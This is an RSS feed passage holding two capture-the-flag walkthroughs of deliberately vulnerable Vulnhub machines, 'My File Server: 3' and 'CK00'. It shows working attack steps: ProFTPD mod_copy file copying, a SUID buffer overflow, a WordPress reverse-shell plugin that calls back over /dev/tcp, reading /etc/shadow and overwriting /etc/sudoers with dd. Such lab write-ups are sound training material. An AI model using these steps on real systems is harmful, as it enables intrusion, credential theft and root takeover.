+  secure                              N    11937  Tue Feb 18 17:18:17 2020
+  spooler                             N        0  Tue Feb 18 17:18:17 2020
+  tallylog                            N        0  Tue Feb 18 17:18:17 2020
+  tuned                               D        0  Tue Feb 18 17:18:17 2020
+  wtmp                                N    25728  Tue Feb 18 17:18:17 2020
+  xferlog                             N      100  Tue Feb 18 17:18:17 2020
+  yum.log                             N    10915  Tue Feb 18 17:18:17 2020
+  sshd_config                         N     3906  Wed Feb 19 13:16:38 2020
+  todo                                N      162  Tue Feb 25 19:52:29 2020
+  id_rsa                              N     1766  Thu Mar 19 10:13:16 2020
+  note.txt                            N      128  Thu Mar 19 10:23:12 2020
+
+		19976192 blocks of size 1024. 18257932 blocks available
+smb: \&gt; exit
+
+#cd .ssh/
+#ls
+ authorized_keys  id_rsa  id_rsa.pub  known_hosts
+#smbclient //192.168.2.11/smbdata
+ Enter WORKGROUP\root's password: 
+ Anonymous login successful
+ Try "help" to get a list of possible commands.
+ smb: \&gt; put authorized_keys 
+ putting file authorized_keys as \authorized_keys (61.7 kb/s) (average 61.7 kb/s)
+ smb: \&gt; 
+</pre>
+<p>It is successfully done. We know that port 2121 ProFTPD 1.3.5 has &#8220;file copy&#8221; vulnerability. So I log in in FTP 2121 without username and password. Then I copy authorized_keys from <strong>/</strong><strong>smbdata</strong> to <strong>/home/smbuser/.ssh/authorized_keys</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#telnet 192.168.2.11 2121
+
+ Trying 192.168.2.11...
+ Connected to 192.168.2.11.
+ Escape character is '^]'.
+  220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.2.11]
+ site help
+  214-The following SITE commands are recognized (* =&gt;'s unimplemented)
+  CPFR &lt;sp&gt; pathname
+  CPTO &lt;sp&gt; pathname
+  HELP
+  CHGRP
+  CHMOD
+  214 Direct comments to root@localhost
+ site cpfr /smbdata/authorized_keys
+  350 File or directory exists, ready for destination name
+ site cpto /home/smbuser/.ssh/authorized_keys
+ 250 Copy successful</pre>
+<p>Now I tried to take ssh from id_rsa file and yehhhhh we got a <strong>smbuser</strong> shell&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:sh highlight:0 decode:true">#ssh smbuser@192.168.2.11 -i id_rsa 
+
+   ##############################################################################################
+   #					  InfoSec Warrior                                       #             
+   #                         --------- www.InfoSecWarrior.com ------------                      #
+   #                                    My File Server - 3					#                    
+   #  			    Just a simple addition to the problem                               #
+   #                               Designed By :- CyberKnight                                   #
+   #                                Twitter    :- @CyberKnight00                                #
+   ##############################################################################################
+
+ Last login: Mon Apr  6 01:39:47 2020 from 192.168.2.1
+ [smbuser@fileserver ~]$ id 
+  uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)
+ [smbuser@fileserver ~]$ hostname 
+  fileserver</pre>
+<p>Here we got two folders at home but I didn&#8217;t get anything and we have no find and locate command for searching suid files. So I have manually searched and I got a file &#8220;<strong>esclate&#8221; </strong> which has suid bit of user bla.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default decode:true">[smbuser@fileserver ~]$  find 
+ -bash: find: command not found
+[smbuser@fileserver ~]$ ls -lha /usr/bin |grep esclate
+ -rwsr-xr-x    1 bla  bla     7.4K Feb 27 00:21 esclate</pre>
+<p>so from this file, we can try to take &#8220;<strong>bla</strong> &#8221; user shell. After feeding a lot of numbers and alphabets .. sometimes it gives &#8220;why are you here?&#8221; and sometimes &#8220;Segmentation fault&#8221; &#8230;</p>
+<p>So I understood what&#8217;s happening here. I gave a value {number} which comes in between both the errors. and yeah &#8220;I got the bla user group&#8221;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">[smbuser@fileserver ~]$ /usr/bin/esclate 
+ 123456789012345678901234567{27}
+ Why are you here ?!
+[smbuser@fileserver ~]$ /usr/bin/esclate
+ 123456789012345687901234567890123456{36}
+ Segmentation fault
+[smbuser@fileserver ~]$ /usr/bin/esclate          
+ 1234567890123456789012345678901{32}
+ Why are you here ?!
+[smbuser@fileserver ~]$ /usr/bin/esclate     
+ 1234567890123456789012345678901234{34}  
+sh-4.2$ id
+ uid=1001(bla) gid=1000(smbuser) groups=1001(bla),1000(smbuser)
+sh-4.2$ hostname 
+ fileserver
+sh-4.2$ uname -a
+ Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+sh-4.2$ 
+</pre>
+<p>Then I tried to go access bla directory and yeh I was finally in.</p>
+<p>and got FLAG of bla user.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ cd home
+sh-4.2$ ls 
+ bla  smbuser
+sh-4.2$ cd bla
+sh-4.2$ ls -lha
+ total 40K
+ drwx------  2 bla  bla  121 Feb 27 00:29 .
+ drwxr-xr-x. 4 root root  30 Feb 25 16:21 ..
+ lrwxrwxrwx  1 bla  bla    9 Feb 25 19:57 .bash_history -&gt; /dev/null
+ -rw-r--r--  1 bla  bla   18 Mar  6  2015 .bash_logout
+ -rw-r--r--  1 bla  bla  193 Mar  6  2015 .bash_profile
+ -rw-r--r--  1 bla  bla  231 Mar  6  2015 .bashrc
+ -rw-rw-r--  1 bla  bla  516 Feb 27 00:29 user.txt
+ -rw-------  1 bla  bla  731 Feb 26 23:36 .viminfo
+ -rwxr-xr-x  1 root root 19K Feb 25 16:22 ynetd
+sh-4.2$ cat user.txt
+   _____ _ _      ____                                     _____ 
+  |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / 
+  | |_  | | |/ _ \___ \ / _ \ '__\ \ / / _ \ '__|  _____    |_ \ 
+  |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |
+  |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/                                                           
+ Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f
+ you can crack this hash, because it is also my pasword
+ note: crack it, itiseasy</pre>
+<p>so after cracking the hash, I got bla user password <strong>bla:itiseasy. </strong>After that, I checked sudo permissions and writes. and I got the two things which can run by Sudo &#8220;capsh&#8221; and &#8220;setcap&#8221;.</p>
+<p>and I got the root shell&#8230;..</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ sudo -l
+ Matching Defaults entries for bla on this host:
+     requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+     env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
+     _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+ User bla may run the following commands on this host:
+     (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap
+
+sh-4.2$ sudo -u root /usr/sbin/capsh --
+[root@fileserver bla]# id
+ uid=0(root) gid=0(root) groups=0(root)
+[root@fileserver bla]# cd /root/
+[root@fileserver ~]# ls 
+ proof.txt
+[root@fileserver ~]# cat proof.txt 
+     _______ __    _____                                       _____
+    / ____(_) /__ / ___/___  ______   _____  _____            |__  /
+   / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; 
+  / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / 
+ /_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  
+                                                                
+ flag : 7be300997079eaebcdf9975ede6746e9
+[root@fileserver ~]# id
+ uid=0(root) gid=0(root) groups=0(root)
+[root@fileserver ~]# hostname
+ fileserver
+[root@fileserver ~]# 
+
+</pre>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-3-walkthrough/">My File Server: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/my-file-server-3-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>CK00: Vulnhub Walkthrough &#124; Infosec Warrior CTF</title>
+		<link>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 31 Mar 2020 08:57:21 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[ck00 walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25791</guid>
+
+					<description><![CDATA[<p>I will share with you a new Walkthrough for Vulnhub machines. CK00: Vulnhub Walkthrough for the CTF Challenge Created by...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/ck00-vulnhub-walkthrough/">CK00: Vulnhub Walkthrough | Infosec Warrior CTF</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I will share with you a new Walkthrough for Vulnhub machines. CK00: Vulnhub Walkthrough for the CTF Challenge Created by Vishal Biswas AKA Cyberknight. You can download here this <a href="https://www.vulnhub.com/entry/ck-00,444/">CTF</a> . It states the level is Easy and that is true. Again, this is in the eye of the beholder but I&#8217;ve seen some boxes where Easy isn&#8217;t exactly Easy. Or maybe it&#8217;s Easy but it&#8217;s a CTF style box. This isn&#8217;t that type of box. It&#8217;s just a poorly configured machine and it has either a few rabbit holes or a few steps I just skipped because you can. Either way, you explore a little if this is unfamiliar and that&#8217;s how you learn.</p>
+<h3><strong><img decoding="async" class="alignnone wp-image-25792 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418.png" alt="ck00 login" width="407" height="185" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418.png 407w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-47-13-e1586276000418-300x136.png 300w" sizes="(max-width: 407px) 100vw, 407px" /></strong></h3>
+<h3><strong>Penetration Testing Methodologies</strong></h3>
+<p><strong>Network Scan</strong></p>
+<ul>
+<li>Netdicover</li>
+<li>Nmap</li>
+</ul>
+<p><strong>Enumeration</strong></p>
+<ul>
+<li>WordPress Enumeration</li>
+<li>Local Hosts file entry</li>
+</ul>
+<p><strong>Exploit</strong></p>
+<ul>
+<li>
+<p class="card-title text-secondary text-center">WordPress plugin php injection.</p>
+</li>
+</ul>
+<p><strong>Privilege Escalation</strong></p>
+<ul>
+<li>Horizontal Privilege Escalation</li>
+<li>wp-config.php</li>
+<li>sudo -l</li>
+</ul>
+<h4>Network Scanning</h4>
+<p>So, as we always start with <strong>netdiscover</strong> to get the IP of the VM machine and the IP of the host I’ve found is 192.168.2.4</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">netdiscover -i vboxnet0</pre>
+<p><img decoding="async" class="alignnone wp-image-25793 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11.png" alt="ck00 ip" width="550" height="118" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11.png 550w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-52-11-300x64.png 300w" sizes="(max-width: 550px) 100vw, 550px" /></p>
+<p>Let’s proceed with network scan using Nmap aggressive scan as given below.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">nmap -p- -sC -A -O 192.168.2.4</pre>
+<p><img decoding="async" class="alignnone wp-image-25794 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55.png" alt="ck00 nmap" width="660" height="447" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55.png 660w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-11-54-55-300x203.png 300w" sizes="(max-width: 660px) 100vw, 660px" /></p>
+<h3>Enumeration</h3>
+<p>First thing we notice is port 80 is open and we see WordPress. When we check out the port in the browser.</p>
+<p><img decoding="async" class="alignnone wp-image-25795 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41.png" alt="ck00 wp" width="738" height="685" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41.png 738w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-10-41-300x278.png 300w" sizes="(max-width: 738px) 100vw, 738px" /></p>
+<p>We can see from the malformed page that we need to add an entry into our hosts file. When we try to access the admin page, we see what name we need to use in our hosts file</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">vim /etc/hosts</pre>
+<p><img decoding="async" class="alignnone wp-image-25796 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11.png" alt="ck00 host" width="419" height="87" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11.png 419w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-12-11-300x62.png 300w" sizes="(max-width: 419px) 100vw, 419px" /></p>
+<p>Eureka !!!!!!!!!! It&#8217;s work and finally got wordpress.</p>
+<p><img decoding="async" class="alignnone wp-image-25797 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27.png" alt="ck00 web" width="944" height="557" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27.png 944w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27-300x177.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-14-27-768x453.png 768w" sizes="(max-width: 944px) 100vw, 944px" /></p>
+<p>Now when we attempt to access the admin page, with credential <strong>admin:admin</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25798 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41.png" alt="ck00 login" width="365" height="494" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41.png 365w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-16-41-222x300.png 222w" sizes="(max-width: 365px) 100vw, 365px" /></p>
+<h3>Exploit</h3>
+<p>When I first started hacking and I came across a WordPress set, I would try all sorts of things to get PHP code into the site. Sometimes you can upload a shell as a plugin, sometimes you can upload a shell as media, both are intentional misconfigurations, and there are plugins that also allow for PHP.</p>
+<p>You can just write your own <a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell" target="_blank" rel="noopener noreferrer">Reverse Shell Plugin</a>.  Save yourself some headaches, just make this, use it, and store it for later use.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">touch rshell.php
+vim rshell.php
+ &lt;?php
+ 
+ /**
+ * Plugin Name: Reverse Shell Plugin
+ * Plugin URI:
+ * Description: Reverse Shell Plugin
+ * Version: 1.0
+ * Author: Dasagreeva
+ * Author URI: https://armourinfosec.com/
+ */
+ exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1'");
+ ?&gt;
+zip rshellplugin.zip rshell.php</pre>
+<p><img decoding="async" class="alignnone wp-image-25799 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02.png" alt="ck00 shell" width="471" height="412" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02.png 471w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-50-02-300x262.png 300w" sizes="(max-width: 471px) 100vw, 471px" /></p>
+<p>Once we get it zipped, we move to the <strong>WordPress UI</strong>. Under <strong>Plugins</strong>, we select <strong>Add New</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25800 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-1024x377.png" alt="ck00 plugin" width="1024" height="377" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-1024x377.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-300x111.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57-768x283.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-51-57.png 1053w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>We activate our <strong>plugin</strong>:</p>
+<p><img decoding="async" class="alignnone wp-image-25801 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40.png" alt="ck00 rv" width="761" height="292" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40.png 761w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-53-40-300x115.png 300w" sizes="(max-width: 761px) 100vw, 761px" /></p>
+<p>We catch our shell. Yesssssssssssss&#8230;&#8230;&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">nc -nlvp 1505</pre>
+<p><img decoding="async" class="alignnone wp-image-25802 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10.png" alt="ck00 nc" width="681" height="253" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10.png 681w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-12-55-10-300x111.png 300w" sizes="(max-width: 681px) 100vw, 681px" /></p>
+<h3><strong>Privilege Escalation</strong></h3>
+<p>We look around for user flag and found it.</p>
+<p><img decoding="async" class="alignnone wp-image-25803 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48.png" alt="ck00 wwwdata" width="347" height="317" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48.png 347w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-01-48-300x274.png 300w" sizes="(max-width: 347px) 100vw, 347px" /></p>
+<p>We then move to <strong>wp</strong>&#8211;<strong>config</strong>.<strong>php</strong> file for credentials.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">cat /var/www/html/wp-config.php</pre>
+<p><img decoding="async" class="alignnone wp-image-25804 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37.png" alt="ck00 sql" width="496" height="478" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37.png 496w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-07-37-300x289.png 300w" sizes="(max-width: 496px) 100vw, 496px" /></p>
+<p>got password <strong>bla_is_my_password</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25805 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15.png" alt="CK00: Vulnhub Walkthrough" width="335" height="398" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15.png 335w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-13-16-15-253x300.png 253w" sizes="(max-width: 335px) 100vw, 335px" /></p>
+<p>Excellent! Here&#8217;s where we cut out a step or two. I saw a few things and maybe that&#8217;s how I&#8217;m supposed to get to bla1 but on a hunch, I guess the password is: <strong>bla1_is_my_password</strong>. I got ssh connection.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">ssh bla1@192.168.2.4</pre>
+<p><img decoding="async" class="alignnone wp-image-25806 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38.png" alt="CK00: Vulnhub Walkthrough" width="670" height="242" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38.png 670w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-01-38-300x108.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></p>
+<p>Checking out my <strong>sudo privileges</strong>, I learn that I can execute <strong>/bin/rbash as the user ck-00</strong> which essentially moves us into the next account.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">sudo -u ck-00 /bin/rbash</pre>
+<p><img decoding="async" class="alignnone wp-image-25807 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07.png" alt="CK00: Vulnhub Walkthrough" width="676" height="246" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07.png 676w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07-300x109.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-04-07-672x246.png 672w" sizes="(max-width: 676px) 100vw, 676px" /></p>
+<p>There is  sudo privileges as our new user.We can execute <strong>/bin/dd</strong> as <strong>root</strong>. dd  allows us to &#8220;convert and copy a file&#8221; and it&#8217;s used for backups. We can also use it to read and write files.We should be able to read the /etc/shadow file as root.</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">sudo dd if=/etc/shadow</pre>
+<p><img decoding="async" class="alignnone wp-image-25808 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17.png" alt="CK00: Vulnhub Walkthrough" width="675" height="176" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17.png 675w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17-300x78.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-08-17-672x176.png 672w" sizes="(max-width: 675px) 100vw, 675px" /></p>
+<p>Excellent! We should also be able to write a new line into sudoers</p>
+<p><img decoding="async" class="alignnone wp-image-25809 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57.png" alt="CK00: Vulnhub Walkthrough" width="836" height="192" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57.png 836w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57-300x69.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-10-57-768x176.png 768w" sizes="(max-width: 836px) 100vw, 836px" /></p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:sh highlight:0 decode:true">echo "ck-00 ALL=(ALL) NOPASSWD: ALL" | sudo dd of=/etc/sudoers</pre>
+<p><img decoding="async" class="alignnone wp-image-25812 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23.png" alt="CK00: Vulnhub Walkthrough" width="553" height="147" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23.png 553w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-40-23-300x80.png 300w" sizes="(max-width: 553px) 100vw, 553px" /></p>
+<p>root flag&#8230;..</p>
+<p><img decoding="async" class="alignnone wp-image-25813 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-1024x346.png" alt="CK00: Vulnhub Walkthrough" width="1024" height="346" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-1024x346.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-300x101.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08-768x259.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-31-14-42-08.png 1119w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>Conclusion: It was an easy CTF with some loop and really nice concepts. It was really helpful for beginners and people preparing for OSCP. Thank to Vishal Biswas AKA Cyberknight . I hope to see more challenges like this in the future.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/ck00-vulnhub-walkthrough/">CK00: Vulnhub Walkthrough | Infosec Warrior CTF</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/ck00-vulnhub-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
